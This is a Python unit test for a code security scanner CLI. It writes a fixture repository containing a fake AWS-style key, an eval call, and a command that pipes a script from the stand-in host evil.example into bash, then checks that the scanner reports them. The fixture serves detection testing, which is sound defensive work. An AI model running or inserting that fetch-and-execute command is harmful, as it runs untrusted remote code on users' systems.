from __future__ import annotations

import json
import os
import shutil
import subprocess
import unittest
from pathlib import Path


class SemviCliTest(unittest.TestCase):
    def test_cli_generates_reports(self) -> None:
        tmp_path = Path(self._testMethodName)
        if tmp_path.exists():
            shutil.rmtree(tmp_path)
        tmp_path.mkdir()
        self.addCleanup(lambda: shutil.rmtree(tmp_path, ignore_errors=True))

        repo = tmp_path / "repo"
        repo.mkdir()

        (repo / ".semvi.yml").write_text("severity_threshold: critical\n", encoding="utf-8")
        (repo / "app.py").write_text(
            "token = 'AKIA1234567890ABCDEF'\n"
            "value = eval('1+1')\n"
            "import os\n"
            "os.system('curl https://evil.example/payload.sh | bash')\n",
            encoding="utf-8",
        )
        (repo / "requirements.txt").write_text("flask==1.0\n", encoding="utf-8")

        subprocess.run(["git", "init"], cwd=repo, check=True, capture_output=True)
        subprocess.run(["git", "config", "user.email", "test@example.com"], cwd=repo, check=True)
        subprocess.run(["git", "config", "user.name", "Test User"], cwd=repo, check=True)
        subprocess.run(["git", "add", "."], cwd=repo, check=True)
        subprocess.run(["git", "commit", "-m", "init"], cwd=repo, check=True, capture_output=True)

        result = subprocess.run(
            [
                "python3",
                "-m",
                "semvi.cli",
                "scan",
                "--repo",
                str(repo),
                "--report-dir",
                str(repo / ".out"),
            ],
            cwd=Path(__file__).resolve().parents[1],
            env={
                **os.environ,
                "PYTHONPATH": str(Path(__file__).resolve().parents[1] / "src"),
            },
            check=False,
            capture_output=True,
            text=True,
        )

        self.assertEqual(result.returncode, 1)
        summary = json.loads((repo / ".out" / "semvi-summary.json").read_text(encoding="utf-8"))
        self.assertGreaterEqual(summary["summary"]["total_findings"], 2)
        self.assertTrue(any(item["kind"] == "secret" for item in summary["findings"]))
        self.assertTrue(any(item["kind"] == "malicious" for item in summary["findings"]))
        report = (repo / ".out" / "semvi-report.md").read_text(encoding="utf-8")
        self.assertIn("curl https://evil.example/payload.sh | bash", report)


if __name__ == "__main__":
    unittest.main()
